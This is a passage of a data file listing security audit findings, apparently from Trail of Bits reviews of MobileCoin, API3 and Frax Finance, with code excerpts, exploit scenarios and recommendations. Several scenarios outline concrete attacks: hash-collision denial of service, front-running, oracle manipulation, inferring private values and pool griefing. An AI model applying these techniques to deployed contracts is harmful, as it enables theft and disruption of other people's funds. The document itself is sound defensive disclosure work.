        "description": "The MobileCoin Foundation is the recipient of all transaction fees and, in certain scenarios, could infer the token ID used in one of multiple transactions included in a block. MCIP-0025 introduced the concept of condential token IDs. The rationale behind the proposal is to allow the MobileCoin network to support tokens other than MOB (MobileCoins native token) in the future. Doing so requires not only that these tokens be unequivocally identiable but also that transactions involving any token, MOB or otherwise, have the same condentiality properties. Before the introduction of the condential tokens feature, all transaction fees were aggregated by the enclave, which created a single transaction fee output per block; however, the same approach applied to a system that supports transfers of tokens other than MOB could introduce information leakage risks. For example, if two users submit two transactions with the same token ID, there would be a single transaction fee output, and therefore, both users would know that they transacted with the same token. To prevent such a leak of information, MCIP-0025 proposes the following: The number of transaction fee outputs on a block should always equal the minimum value between the number of token IDs and the number of transactions in that block (e.g., num_tx_fee_out = min(num_token_ids, num_transactions)). This essentially means that a block with a single transaction will still have a single transaction fee output, but a block with multiple transactions with the same token ID will have multiple transaction fee outputs, one with the aggregated fee and the others with a zero-value fee. Finally, it is worth mentioning that transaction fees are not paid in MOB but in the token that is being transacted; this creates a better user experience, as users do not need to own MOB to send tokens to other people. While this proposal does indeed preserve the condentiality requirement, it falls short in one respect: the receiver of all transaction fees in the MobileCoin network is the MobileCoin Foundation, meaning that it will always know the token ID corresponding to a transaction fee output. Therefore, if only a single token is used in a block, the foundation will know the token ID used by all of the transactions in that block. Exploit Scenario Alice and Bob use the MobileCoin network to make payments between them. They send each other multiple payments, using the same token, and their transactions are included in a single block. Eve, who has access to the MobileCoin Foundations viewing key, is able to decrypt the transaction fee outputs corresponding to that block and, because no other token was used inside the block, is able to infer the token that Alice and Bob used to make the payments. Recommendations Short term, document the fact that transaction token IDs are visible to the MobileCoin Foundation. Transparency on this issue will help users understand the information that is visible by some parties. Additionally, consider implementing the following alternative designs:  Require that all transaction fees be paid in MOB. This solution would result in a degraded user experience compared to the current design; however, it would address the issue at hand.  Aggregate fee outputs across multiple blocks. This solution would achieve only probabilistic condentiality of information because if all those blocks transact in the same token, the foundation would still be able to infer the ID. Long term, document the trade-os between allowing users to pay fees in the tokens they transact with and restricting fee payments to only MOB, and document how these trade-os could aect the condentiality of the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Token IDs are protected only by SGX ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "description": "Token IDs are intended to be condential. However, they are operated on within an SGX enclave. This is an apparent departure from MobileCoins previous approach of using SGX as an additional security mechanism, not a primary one. Previously, most condential information in MobileCoin was protected by SGX and another security mechanism. Examples include the following:  A transactions senders, recipients, and amounts are protected by SGX and ring signatures.  The transactions a user interacts with through Fog are protected by both SGX and oblivious RAM. However, token IDs are protected by SGX alone. (An example in which a token ID is operated on within an enclave appears in gure 3.1.) Thus, the incorporation of condential tokens seems to represent a shift in MobileCoins security posture. let token_id = TokenId::from(tx.prefix.fee_token_id); let minimum_fee = ct_min_fees .get(&token_id) .ok_or(TransactionValidationError::TokenNotYetConfigured)?; Figure 3.1: consensus/enclave/impl/src/lib.rs#L239-L243 Exploit Scenario Mallory learns of a vulnerability that allows her to see inside of an SGX enclave. Mallory uses the vulnerability to observe the token IDs used in transactions in a MobileCoin enclave that she runs. Recommendations Short term, document the fact that token IDs are not oered the same level of security as other aspects of MobileCoin. This will help set users expectations regarding the condentiality of their information (i.e., whether it could be revealed to an attacker). Long term, continue to investigate solutions to the security problems surrounding the condential tokens feature. A solution that does not reveal token IDs to the enclave could exist.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Nonces are not stored per token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "description": "Mint and mint conguration transaction nonces are not distinguished by the tokens with which they are associated. Malicious minters or governors could use this fact to conduct denial-of-service attacks against other minters and governors. The relevant code appears in gures 4.1 and 4.2. For each type of transaction, nonces are inserted into a seen_nonces set without regard to the token indicated in the transaction. let mut seen_nonces = BTreeSet::default(); let mut validated_txs = Vec::with_capacity(mint_config_txs.len()); for tx in mint_config_txs { // Ensure all nonces are unique. if !seen_nonces.insert(tx.prefix.nonce.clone()) { return Err(Error::FormBlock(format!( \"Duplicate MintConfigTx nonce: {:?}\", tx.prefix.nonce ))); } Figure 4.1: consensus/enclave/impl/src/lib.rs#L342-L352 let mut mint_txs = Vec::with_capacity(mint_txs_with_config.len()); let mut seen_nonces = BTreeSet::default(); for (mint_tx, mint_config_tx, mint_config) in mint_txs_with_config { // The nonce should be unique. if !seen_nonces.insert(mint_tx.prefix.nonce.clone()) { return Err(Error::FormBlock(format!( \"Duplicate MintTx nonce: {:?}\", mint_tx.prefix.nonce ))); } Figure 4.2: consensus/enclave/impl/src/lib.rs#L384-L393 Note that the described attack could be made worse by how nonces are intended to be used. The following passage from the white paper suggests that nonces are generated deterministically from public data. Generating nonces in this way could make them easy for an attacker to predict. When submitting a MintTx, we include a nonce to protect against replay attacks, and a tombstone block to prevent the transaction from being nominated indenitely, and these are committed to the chain. (For example, in a bridge application, this nonce may be derived from records on the source chain, to ensure that each deposit on the source chain leads to at most one mint.) Exploit Scenario Mallory (a minter) learns that Alice (another minter) intends to submit a mint transaction with a particular nonce. Mallory submits a mint transaction with that nonce rst, making Alices invalid. Recommendations Short term, store nonces per token, instead of all together. Doing so will prevent the denial-of-service attack described above. Long term, when adding new data to blocks or to the blockchain conguration, carefully consider whether it should be stored per token. Doing so could help to prevent denial-of-service attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Clients have no option for verifying blockchain conguration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "description": "Clients have no way to verify whether the MobileCoin node they connect to is using the correct blockchain conguration. This exposes users to attacks, as detailed in the white paper: Similarly to how the nodes ensure that they are similarly congured during attestation, (by mixing a hash of their conguration into the responder id used during attestation), the peer- to-node attestation channels could also do this, so that users can fail to attest immediately if malicious manipulation of conguration has occurred. The problem with this approach is that the users have no particularly good source of truth around the correct runtime conguration of the services. The problem that users have no particularly good source of truth could be solved by publishing the latest blockchain conguration via a separate channel (e.g., a publicly accessible server). Furthermore, allowing users to opt in to such additional checks would provide additional security to users who desire it. Exploit Scenario Alice falls victim to the attack described in the white paper. The attack would have been thwarted had Alice known that the node she connected to was not using the correct blockchain conguration. Recommendations Short term, make the current blockchain conguration publicly available, and allow nodes to attest to clients using their conguration. Doing so will help security-conscious users to better protect themselves. Long term, avoid withholding data from clients during attestation. Adopt a general principle that if data should be included in node-to-node attestation, then it should be included in node-to-client attestation as well. Doing so will help to ensure the security of users.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Condential tokens cannot support frequent price swings ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "description": "The method for determining tokens minimum fees has limited applicability. In particular, it cannot support tokens whose prices change frequently. In principle, a tokens minimum fee should be comparable in value to the MOB minimum fee. Thus, if a tokens price increases relative to the price of MOB, the tokens minimum fee should decrease. Similarly, if a tokens price decreases relative to the price of MOB, the tokens minimum fee should increase. However, an enclave sets its fee map from the blockchain conguration during initialization (gure 6.1) and does not change the fee map thereafter. Thus, the enclave would seem to have to be restarted if its blockchain conguration and fee map were to change. This fact implies that the current setup cannot support tokens whose prices shift frequently. fn enclave_init( &self, peer_self_id: &ResponderId, client_self_id: &ResponderId, sealed_key: &Option<SealedBlockSigningKey>, blockchain_config: BlockchainConfig, ) -> Result<(SealedBlockSigningKey, Vec<String>)> { // Check that fee map is actually well formed FeeMap::is_valid_map(blockchain_config.fee_map.as_ref()).map_err(Error::FeeMap)?; // Validate governors signature. if !blockchain_config.governors_map.is_empty() { let signature = blockchain_config .governors_signature .ok_or(Error::MissingGovernorsSignature)?; let minting_trust_root_public_key = Ed25519Public::try_from(&MINTING_TRUST_ROOT__KEY[..]) .map_err(Error::ParseMintingTrustRootPublicKey)?; minting_trust_root_public_key .verify_governors_map(&blockchain_config.governors_map, &signature) .map_err(|_| Error::InvalidGovernorsSignature)?; } self.ct_min_fee_map .set(Box::new( blockchain_config.fee_map.as_ref().iter().collect(), )) .expect(\"enclave was already initialized\"); Figure 6.1: consensus/enclave/impl/src/lib.rs#L454-L483 Exploit Scenario MobileCoin integrates token T. The value of T decreases, but the minimum fee remains the same. Users pay the minimum fee, resulting in lost income to the MobileCoin Foundation. Recommendations Short term, accept only tokens with a history of price stability. Doing so will ensure that the new features are used only with tokens that can be supported. Long term, consider including two inputs in each transaction, one for the token transferred and one to pay the fee in MOB, as suggested in TOB-MCCT-2.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Overow handling could allow recovery of transaction token ID ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "description": "The systems fee calculation could overow a u64 value. When this occurs, the fee is divided up into multiple smaller fees, each tting into a u64 value. Under certain conditions, this behavior could be abused to reveal whether a token ID is used in a block. The relevant code appears in gure 7.1. The hypothetical attack is described in the exploit scenario below. loop { let output_fee = min(total_fee, u64::MAX as u128) as u64; outputs.push(mint_output( config.block_version, &fee_recipient, FEES_OUTPUT_PRIVATE_KEY_DOMAIN_TAG.as_bytes(), parent_block, &transactions, Amount { value: output_fee, token_id, }, outputs.len(), )); total_fee -= output_fee as u128; if total_fee == 0 { break; } } Figure 7.1: consensus/enclave/impl/src/lib.rs#L855-L873 Exploit Scenario Mallory is a (malicious) minter of token T. Suppose B is a recently minted block whose total number of fee outputs is equal to the number of tokens, which is less than the number of transactions in B. Further suppose that Mallory wishes to determine whether B contains a transaction involving T. Mallory does the following: 1. She puts her node into its state just prior to the minting of B. 2. She mints to herself a quantity of T worth u64::MAX / min_fee * min_fee. Call this quantity F. 3. She submits to her node a transaction with a fee of F. 4. She allows the block to be minted. 5. She observes the number of fee outputs in the modied block, B: a. b. If B does not contain a transaction involving T, then B contains a fee output for T equal to zero, and B contains a fee output for T equal to F. If B does contain a transaction involving T, then B contains a fee output for T equal to at least min_fee, and B contains two fee outputs for T, one of which is equal to u64::MAX. Thus, by observing the number of outputs in B, Mallory can determine whether B contains a transaction involving T. Recommendations Short term, require the total supply of all incorporated tokens not to exceed a u64 value. Doing so will eliminate the possibility of overow and prevent the attack described above. Long term, consider incorporating randomness into the number of fee outputs generated. This could provide an alternative means of preventing the attack in a way that still allows for overow. Alternatively, consider including two inputs in each transaction, one for the token transferred and one to pay the fee in MOB, as suggested in TOB-MCCT-2.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Publish-subscribe protocol users are vulnerable to a denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "description": "The API3 system implements a publish-subscribe protocol through which a requester can receive a callback from an API when specied conditions are met. These conditions can be hard-coded when the Airnode is congured or stored on-chain. When they are stored on-chain, the user can call storeSubscription to establish other conditions for the callback (by specifying parameters and conditions arguments of type bytes ). The arguments are then used in abi.encodePacked , which could result in a subscriptionId collision. function storeSubscription( [...] bytes calldata parameters, bytes calldata conditions, [...] ) external override returns ( bytes32 subscriptionId) { [...] subscriptionId = keccak256 ( abi .encodePacked( chainId, airnode, templateId, parameters , conditions , relayer, sponsor, requester, fulfillFunctionId ) ); subscriptions[subscriptionId] = Subscription({ chainId: chainId, airnode: airnode, templateId: templateId, parameters: parameters, conditions: conditions, relayer: relayer, sponsor: sponsor, requester: requester, fulfillFunctionId: fulfillFunctionId }); Figure 1.1: StorageUtils.sol#L135-L158 The Solidity documentation includes the following warning: If you use keccak256(abi.encodePacked(a, b)) and both a and b are dynamic types, it is easy to craft collisions in the hash value by moving parts of a into b and vice-versa. More specically, abi.encodePacked(\"a\", \"bc\") == abi.encodePacked(\"ab\", \"c\"). If you use abi.encodePacked for signatures, authentication or data integrity, make sure to always use the same types and check that at most one of them is dynamic. Unless there is a compelling reason, abi.encode should be preferred. Figure 1.2: The Solidity documentation details the risk of a collision caused by the use of abi.encodePacked with more than one dynamic type. Exploit Scenario Alice calls storeSubscription to set the conditions for a callback from a specic API to her smart contract. Eve, the owner of a competitor protocol, calls storeSubscription with the same arguments as Alice but moves the last byte of the parameters argument to the beginning of the conditions argument. As a result, the Airnode will no longer report API results to Alices smart contract. Recommendations Short term, use abi.encode instead of abi.encodePacked . Long term, carefully review the Solidity documentation , particularly the Warning sections regarding the pitfalls of abi.encodePacked .",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "description": "The API3 contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the API3 contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Decisions to opt out of a monetization scheme are irreversible ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "description": "The API3 protocol implements two on-chain monetization schemes. If an Airnode owner decides to opt out of a scheme, the Airnode will not receive additional token payments or deposits (depending on the scheme). Although the documentation states that Airnodes can opt back in to a scheme, the current implementation does not allow it. /// @notice If the Airnode is participating in the scheme implemented by /// the contract: /// Inactive: The Airnode is not participating, but can be made to /// participate by a mantainer /// Active: The Airnode is participating /// OptedOut: The Airnode actively opted out, and cannot be made to /// participate unless this is reverted by the Airnode mapping(address => AirnodeParticipationStatus) public override airnodeToParticipationStatus; Figure 3.1: RequesterAuthorizerWhitelisterWithToken.sol#L59-L68 /// @notice Sets Airnode participation status /// @param airnode Airnode address /// @param airnodeParticipationStatus Airnode participation status function setAirnodeParticipationStatus( address airnode, AirnodeParticipationStatus airnodeParticipationStatus ) external override onlyNonZeroAirnode(airnode) { if (msg.sender == airnode) { require( airnodeParticipationStatus == AirnodeParticipationStatus.OptedOut, \"Airnode can only opt out\" ); } else { [...] Figure 3.2: RequesterAuthorizerWhitelisterWithToken.sol#L229-L242 Exploit Scenario Bob, an Airnode owner, decides to temporarily opt out of a scheme, believing that he will be able to opt back in; however, he later learns that that is not possible and that his Airnode will be unable to accept any new requesters. Recommendations Short term, adjust the setAirnodeParticipationStatus function to allow Airnodes that have opted out of a scheme to opt back in. Long term, write extensive unit tests that cover all of the expected pre- and postconditions. Unit tests could have uncovered this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Depositors can front-run request-blocking transactions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "description": "A depositor can front-run a request-blocking transaction and withdraw his or her deposit. The RequesterAuthorizerWhitelisterWithTokenDeposit contract enables a user to indenitely whitelist a requester by depositing tokens on behalf of the requester. A manager or an address with the blocker role can call setRequesterBlockStatus or setRequesterBlockStatusForAirnode with the address of a requester to block that user from submitting requests; as a result, any user who deposited tokens to whitelist the requester will be blocked from withdrawing the deposit. However, because one can execute a withdrawal immediately, a depositor could monitor the transactions and call withdrawTokens to front-run a blocking transaction. Exploit Scenario Eve deposits tokens to whitelist a requester. Because the requester then uses the system maliciously, the manager blacklists the requester, believing that the deposited tokens will be seized. However, Eve front-runs the transaction and withdraws the tokens. Recommendations Short term, implement a two-step withdrawal process in which a depositor has to express his or her intention to withdraw a deposit and the funds are then unlocked after a waiting period. Long term, analyze all possible front-running risks in the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Incompatibility with non-standard ERC20 tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "description": "The RequesterAuthorizerWhitelisterWithTokenPayment and RequesterAuthorizerWhitelisterWithTokenDeposit contracts are meant to work with any ERC20 token. However, several high-prole ERC20 tokens do not correctly implement the ERC20 standard. These include USDT, BNB, and OMG, all of which have a large market cap. The ERC20 standard denes two transfer functions, among others:  transfer(address _to, uint256 _value) public returns (bool success)  transferFrom(address _from, address _to, uint256 _value) public returns (bool success) These high-prole ERC20 tokens do not return a boolean when at least one of the two functions is executed. As of Solidity 0.4.22, the size of return data from external calls is checked. As a result, any call to the transfer or transferFrom function of an ERC20 token with an incorrect return value will fail. Exploit Scenario Bob deploys the RequesterAuthorizerWhitelisterWithTokenPayment contract with USDT as the token. Alice wants to pay for a requester to be whitelisted and calls payTokens , but the transferFrom call fails. As a result, the contract is unusable. Recommendations Short term, consider using the OpenZeppelin SafeERC20 library or adding explicit support for ERC20 tokens with incorrect return values. Long term, adhere to the token integration best practices outlined in appendix C .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "6. Compromise of a single oracle enables limited control of the dAPI value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "description": "By compromising only one oracle, an attacker could gain control of the median price of a dAPI and set it to a value within a certain range. The dAPI value is the median of all values provided by the oracles. If the number of oracles is odd (i.e., the median is the value in the center of the ordered list of values), an attacker could skew the median, setting it to a value between the lowest and highest values submitted by the oracles. Exploit Scenario There are three available oracles: O 0 , with a price of 603; O 1 , with a price of 598; and O 2 , which has been compromised by Eve. Eve is able to set the median price to any value in the range [598 , 603] . Eve can then turn a prot by adjusting the rate when buying and selling assets. Recommendations Short term, be mindful of the fact that there is no simple x for this issue; regardless, we recommend implementing o-chain monitoring of the DapiServer contracts to detect any suspicious activity. Long term, assume that an attacker may be able to compromise some of the oracles. To mitigate a partial compromise, ensure that dAPI value computations are robust.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "description": "The execution of yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. DapiServer beacon data is accessible to all users ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "description": "The lack of access controls on the conditionPspDapiUpdate function could allow an attacker to read private data on-chain. The dataPoints[] mapping contains private data that is supposed to be accessible on-chain only by whitelisted users. However, any user can call conditionPspDapiUpdate , which returns a boolean that depends on arithmetic over dataPoint : /// @notice Returns if the respective dAPI needs to be updated based on the /// condition parameters /// @dev This method does not allow the caller to indirectly read a dAPI, /// which is why it does not require the sender to be a void signer with /// zero address. [...] function conditionPspDapiUpdate( bytes32 subscriptionId, // solhint-disable-line no-unused-vars bytes calldata data, bytes calldata conditionParameters ) external override returns (bool) { bytes32 dapiId = keccak256(data); int224 currentDapiValue = dataPoints[dapiId].value; require( dapiId == updateDapiWithBeacons(abi.decode(data, (bytes32[]))), \"Data length not correct\" ); return calculateUpdateInPercentage( currentDapiValue, dataPoints[dapiId].value ) >= decodeConditionParameters(conditionParameters); } Figure 8.1: dapis/DapiServer.sol:L468-L502 An attacker could abuse this function to deduce one bit of data per call (to determine, for example, whether a users account should be liquidated). An attacker could also automate the process of accessing one bit of data to extract a larger amount of information by using a mechanism such as a dichotomic search. An attacker could therefore infer the value of dataPoin t directly on-chain. Exploit Scenario Eve, who is not whitelisted, wants to read a beacon value to determine whether a certain users account should be liquidated. Using the code provided in appendix E , she is able to conrm that the beacon value is greater than or equal to a certain threshold. Recommendations Short term, implement access controls to limit who can call conditionPspDapiUpdate . Long term, document all read and write operations related to dataPoint , and highlight their access controls. Additionally, consider implementing an o-chain monitoring system to detect any suspicious activity.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Misleading function name ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf",
        "description": "The conditionPspDapiUpdate function always updates the dataPoints storage variable (by calling updateDapiWithBeacons ), even if the function returns false (i.e., the condition for updating the variable is not met). This contradicts the code comment and the behavior implied by the functions name. /// @notice Returns if the respective dAPI needs to be updated based on the /// condition parameters [...] function conditionPspDapiUpdate( bytes32 subscriptionId, // solhint-disable-line no-unused-vars bytes calldata data, bytes calldata conditionParameters ) external override returns (bool) { bytes32 dapiId = keccak256(data); int224 currentDapiValue = dataPoints[dapiId].value; require( dapiId == updateDapiWithBeacons(abi.decode(data, (bytes32[]))), \"Data length not correct\" ); return calculateUpdateInPercentage( currentDapiValue, dataPoints[dapiId].value ) >= decodeConditionParameters(conditionParameters); } Figure 9.1: dapis/DapiServer.sol#L468-L502 Recommendations Short term, revise the documentation to inform users that a call to conditionPspDapiUpdate will update the dAPI even if the function returns false . Alternatively, develop a function similar to updateDapiWithBeacons that returns the updated value without actually updating it. Long term, ensure that functions names reect the implementation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Risk of unexpected results when long-term swaps involving rebasing tokens are canceled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "description": "FraxSwaps use of rebasing tokenstokens whose supply can be adjusted to control their pricescould cause transactions to revert after users cancel or withdraw from long-term swaps. FraxSwap oers a new type of swap called a long-term swap, which executes certain swaps over an extended period of time. Users can cancel or withdraw from long-term swaps and recover all of their purchased and unsold tokens. ///@notice stop the execution of a long term order function cancelLongTermSwap(uint256 orderId) external lock execVirtualOrders { (address sellToken, uint256 unsoldAmount, address buyToken, uint256 purchasedAmount) = longTermOrders.cancelLongTermSwap(orderId); bool buyToken0 = buyToken == token0; twammReserve0 -= uint112(buyToken0 ? purchasedAmount : unsoldAmount); twammReserve1 -= uint112(buyToken0 ? unsoldAmount : purchasedAmount); // transfer to owner of order _safeTransfer(buyToken, msg.sender, purchasedAmount); _safeTransfer(sellToken, msg.sender, unsoldAmount); // update order. Used for tracking / informational longTermOrders.orderMap[orderId].isComplete = true; emit CancelLongTermOrder(msg.sender, orderId, sellToken, unsoldAmount, buyToken, purchasedAmount); } Figure 1.1: The cancelLongTermSwap function in the UniV2TWAMMPair contract However, if a rebasing token is used in a long-term swap, the balance of the UniV2TWAMMPair contract could increase or decrease over time. Such changes in the contracts balance could result in unintended eects when users try to cancel or withdraw from long-term swaps. For example, because all long-term swaps for a pair are processed as part of any function with the execVirtualOrders modier, if the actual balance of the UniV2TWAMMPair is reduced as part of one or more rebases in the underlying token, this balance will not be reected correctly in the contracts internal accounting, and cancel and withdraw operations will transfer too many tokens to users. Eventually, this will exhaust the contracts balance of the token before all users are able to withdraw, causing these transactions to revert. Exploit Scenario Alice creates a long-term swap; one of the tokens to be swapped is a rebasing token. After some time, the tokens supply is adjusted, causing the balance of UniV2TWAMMPair to decrease. Alice tries to cancel the long-term swap, but the internal bookkeeping for her swap was not updated to reect the rebase, causing the token transfer from the contract to Alice to revert and blocking her other token transfers from completing. To allow Alice to access funds and to allow subsequent transactions to succeed, some tokens need to be explicitly sent to the UniV2TWAMMPair contract to increase its balance. Recommendations Short term, explicitly document issues involving rebasing tokens and long-term swaps to ensure that users are aware of them. Long term, evaluate the security risks surrounding ERC20 tokens and how they could aect every system component. References  Common errors with rebasing tokens on Uniswap V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Missing liquidity checks when initiating long-term swaps ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "description": "When a long-term swap is submitted to a UniV2TWAMMPair instance, the code performs checks, such as those ensuring that the selling rate of a given token is nonzero, before the order is recorded. However, the code does not validate the existing reserves for the tokens being bought in long-term swaps. ///@notice adds long term swap to order pool function performLongTermSwap(LongTermOrders storage longTermOrders, address from, address to, uint256 amount, uint256 numberOfTimeIntervals) private returns (uint256) { // make sure to update virtual order state (before calling this function) //determine the selling rate based on number of blocks to expiry and total amount uint256 currentTime = block.timestamp; uint256 lastExpiryTimestamp = currentTime - (currentTime % longTermOrders.orderTimeInterval); uint256 orderExpiry = longTermOrders.orderTimeInterval * (numberOfTimeIntervals + 1) + lastExpiryTimestamp; uint256 sellingRate = SELL_RATE_ADDITIONAL_PRECISION * amount / (orderExpiry - currentTime); require(sellingRate > 0); // tokenRate cannot be zero Figure 2.1: Uniswap_V2_TWAMM/twamm/LongTermOrders.sol#L118-L128 If a long-term swap is submitted before adequate liquidity has been added to the pool, the next pool operation will attempt to trade against inadequate liquidity, resulting in a division-by-zero error in the line highlighted in blue in gure 2.2. As a result, all pool operations will revert until the number of tokens needed to begin executing the virtual swap are added. ///@notice computes the result of virtual trades by the token pools function computeVirtualBalances( uint256 token0Start, uint256 token1Start, uint256 token0In, uint256 token1In) internal pure returns (uint256 token0Out, uint256 token1Out, uint256 ammEndToken0, uint256 ammEndToken1) { token0Out = 0; token1Out = 0; //when both pools sell, we use the TWAMM formula else { uint256 aIn = token0In * 997 / 1000; uint256 bIn = token1In * 997 / 1000; uint256 k = token0Start * token1Start; ammEndToken1 = token0Start * (token1Start + bIn) / (token0Start + aIn); ammEndToken0 = k / ammEndToken1; token0Out = token0Start + aIn - ammEndToken0; token1Out = token1Start + bIn - ammEndToken1; } Figure 2.2: Uniswap_V2_TWAMM/twamm/ExecVirtualOrders.sol#L39-L78 The long-term swap functionality can be paused by the contract owner (e.g., to prevent long-term swaps when a pool has inadequate liquidity); however, by default, the functionality is enabled when a new pool is deployed. An attacker could exploit this fact to grief a newly deployed pool by submitting long-term swaps early in its lifecycle when it has minimal liquidity. Additionally, even if a newly deployed pool is already loaded with adequate liquidity, a user could submit long-term swaps with zero intervals to trigger an integer underow in the line highlighted in red in gure 2.2. However, note that the user would have to submit at least one long-term swap that requires more than the total liquidity in the reserve: testSync(): failed! Call sequence:     initialize(6809753114178753104760,5497681857357274469621,837982930770660231771 7,10991961728915299510446) longTermSwapFrom1To0(2,0) testLongTermSwapFrom0To1(23416246225666705882600004967801889944504351201487667 6541160061227714669,0) testSync() Time delay: 37073 seconds Block delay: 48 Figure 2.3: The Echidna output that triggers a revert in a call to sync() Exploit Scenario A new FraxSwap pool is deployed, causing the long-term swap functionality to be unpaused. Before users have a chance to add sucient liquidity to the pool, Eve initiates long-term swaps in both directions. Since there are no tokens available to purchase, all pool operations revert, and the provided tokens are trapped. At this point, adding more liquidity is not possible since doing so also triggers the long-term swap computation, forcing a revert. Recommendations Short term, disable new swaps and remove all the liquidity in the deployed contracts. Modify the code so that, moving forward, liquidity can be added without executing long-term swaps. Document the pool state requirements before long-term swaps can be enabled. Long term, use extensive smart contract fuzzing to test that important operations cannot be blocked.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing events in several contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ22022.pdf",
        "description": "An insucient number of events is declared in the Frax Finance contracts. As a result, malfunctioning contracts or malicious attacks may not be noticed. For instance, long-term swaps are executed in batches by the executeVirtualOrdersUntilTimestamp function: ///@notice executes all virtual orders until blockTimestamp is reached. function executeVirtualOrdersUntilTimestamp(LongTermOrders storage longTermOrders, uint256 blockTimestamp, ExecuteVirtualOrdersResult memory reserveResult) internal { uint256 nextExpiryBlockTimestamp = longTermOrders.lastVirtualOrderTimestamp - (longTermOrders.lastVirtualOrderTimestamp % longTermOrders.orderTimeInterval) + longTermOrders.orderTimeInterval; //iterate through time intervals eligible for order expiries, moving state forward OrderPool storage orderPool0 = longTermOrders.OrderPool0; OrderPool storage orderPool1 = longTermOrders.OrderPool1; while (nextExpiryBlockTimestamp < blockTimestamp) { // Optimization for skipping blocks with no expiry if (orderPool0.salesRateEndingPerTimeInterval[nextExpiryBlockTimestamp] > 0 || orderPool1.salesRateEndingPerTimeInterval[nextExpiryBlockTimestamp] > 0) { //amount sold from virtual trades uint256 blockTimestampElapsed = nextExpiryBlockTimestamp - longTermOrders.lastVirtualOrderTimestamp; uint256 token0SellAmount = orderPool0.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; uint256 token1SellAmount = orderPool1.currentSalesRate * blockTimestampElapsed / SELL_RATE_ADDITIONAL_PRECISION; (uint256 token0Out, uint256 token1Out) = executeVirtualTradesAndOrderExpiries(reserveResult, token0SellAmount, token1SellAmount); orderPool1, token0Out, token1Out, nextExpiryBlockTimestamp); updateOrderPoolAfterExecution(longTermOrders, orderPool0, } nextExpiryBlockTimestamp += longTermOrders.orderTimeInterval; } //finally, move state to current blockTimestamp if 